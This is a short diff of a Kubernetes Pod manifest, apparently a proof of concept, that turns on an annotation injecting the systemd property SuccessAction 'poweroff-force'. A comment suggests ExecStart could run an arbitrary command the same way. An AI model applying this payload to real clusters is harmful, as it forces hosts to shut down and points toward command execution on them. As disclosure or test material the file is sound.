@@ -2,7 +2,7 @@ apiVersion: v1
 kind: Pod
 metadata:
   name: poc-arbitrary-systemd-property-injection
-  # annotations:
+  annotations:
     # I believe that ExecStart with an arbitrary command works here too,
     # but I haven't figured out how to marshalize the ExecStart struct to gvariant string.
     org.systemd.property.SuccessAction: "'poweroff-force'"
